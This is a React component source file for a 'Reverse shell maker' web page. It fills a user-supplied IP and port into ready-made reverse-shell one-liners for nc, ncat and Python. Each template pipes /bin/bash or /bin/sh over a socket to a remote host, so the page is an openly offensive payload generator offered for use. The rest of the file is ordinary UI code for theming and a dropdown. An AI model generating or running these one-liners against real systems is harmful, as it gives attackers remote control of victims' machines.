import "./App.css";
import React, { useState } from "react";
import Select from "react-select";
const Countries = [
  { label: "nc", value: 1 },
  { label: "ncat", value: 2 },
  { label: "python", value: 3 },
];
const shells = [
  {
    id: 1,
    shell: "nc 0.0.0.0 0000 -e /bin/bash",
  },
  {
    id: 2,
    shell: "ncat 0.0.0.0 0000 -e /bin/bash",
  },
  {
    id: 3,
    shell: `export RHOST="0.0.0.0";export RPORT=0000;python -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'`,
  },
];
function App() {
  const [dark, setDark] = useState(true);
  const [ip, setIp] = useState("192.168.0.1");
  const [port, setPort] = useState("4444");
  const [whichShell, setwhichShell] = useState(0);
  return (
    <div className={dark ? "dark" : "light"}>
      <div className="body">
        <div className="switch">
          <label>
            {dark ? "dark" : "light"}
            <input
              type="checkbox"
              onChange={(e) => {
                // console.log(e.type);
                setDark(!dark);
              }}
            />
            <span className="lever"></span>
          </label>
        </div>
        <div
          style={{
            justifyContent: "center",
            alignItems: "center",
            display: "flex",
          }}
        >
          <h3>Reverse shell maker</h3>
        </div>
        <div className="boxBody">
          <div className={dark ? "boxDark" : "boxLight"}>
            ip & port
            <div className="input-field col s6">
              <input
                id="IP"
                value={ip}
                style={{ color: dark ? "#fff" : "#000" }}
                type="text"
                className="validate"
                onChange={(e) => setIp(e.target.value)}
              />
              <label for="IP">IP</label>
            </div>
            <div className="input-field col s6">
              <input
                id="PORT"
                value={port}
                style={{ color: dark ? "#fff" : "#000" }}
                type="text"
                className="validate"
                onChange={(e) => setPort(e.target.value)}
              />
              <label for="PORT">PORT</label>
            </div>
          </div>
          <div className={dark ? "boxDark" : "boxLight"}>
            listner
            <div>
              <Select
                style={{ color: dark ? "#fff" : "#000" }}
                options={Countries}
                onChange={(e) => {
                  // alert(e.value);
                  setwhichShell(e.value - 1);
                }}
                theme={(theme) => ({
                  ...theme,
                  borderRadius: 0,
                  colors: {
                    // ...theme.colors,
                    text: "#000",
                    primary25: "#aff",
                    // primary: "#000",
                    // color: "#000",
                  },
                })}
              />
            </div>
          </div>
        </div>
        <div
          style={{
            display: "flex",
            // background: "red",
            alignItems: "center",
            justifyContent: "center",
            flexDirection: "column",
          }}
        >
          Shell
          <div
            style={{
              width: "60vw",
              background: "red",
              opacity: 0.5,
              borderRadius: 10,
              display: "flex",
              alignItems: "center",
              justifyContent: "center",
              flexWrap: "wrap",
            }}
          >
            {shells[whichShell].shell
              .replace("0.0.0.0", ip)
              .replace("0000", port)}
          </div>
        </div>
      </div>
    </div>
  );
}

export default App;
